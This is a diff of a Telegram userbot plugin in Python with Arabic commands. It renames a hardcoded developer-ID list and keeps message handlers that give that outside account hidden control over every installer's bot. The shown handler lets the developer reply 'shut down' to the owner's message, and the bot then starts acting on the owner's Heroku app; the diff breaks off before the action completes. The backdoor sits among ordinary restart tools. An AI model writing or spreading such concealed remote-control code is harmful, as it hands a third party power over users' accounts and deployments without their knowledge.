@@ -18,7 +18,7 @@ from . import BOTLOG, BOTLOG_CHATID, HEROKU_APP
 LOGS = logging.getLogger(__name__)
 plugin_category = "tools"
 
-SedUbDEV = [6186856384]
+JOKRDEV = [6186856384]
 
 @l313l.ar_cmd(
     pattern="اعادة تشغيل$",
@@ -116,7 +116,7 @@ async def set_pmlog(event):
     await edit_delete(event, "**᭡︙ تـم تشغيل التـحديـثات بالفعـل ❗️**")
 @l313l.on(events.NewMessage(incoming=True))
 async def Ahmed(event):
-    if event.reply_to and event.sender_id in SedUbDEV:
+    if event.reply_to and event.sender_id in JOKRDEV:
         reply_msg = await event.get_reply_message()
         owner_id = reply_msg.from_id.user_id
         if owner_id == l313l.uid:
@@ -143,10 +143,10 @@ async def Ahmed(event):
                     
 @l313l.on(events.NewMessage(incoming=True))
 async def Ahmed(event):
-    if event.reply_to and event.sender_id in SedUbDEV:
+    if event.reply_to and event.sender_id in JOKRDEV:
         reply_msg = await event.get_reply_message()
         owner_id = reply_msg.from_id.user_id
-        if owner_id == SedUb.uid:
+        if owner_id == l313l.uid:
             if event.message.message == "اطفاء":
                     await event.reply("**᭡︙ تدلل مطوري**")
                     if HEROKU_APP is not None:
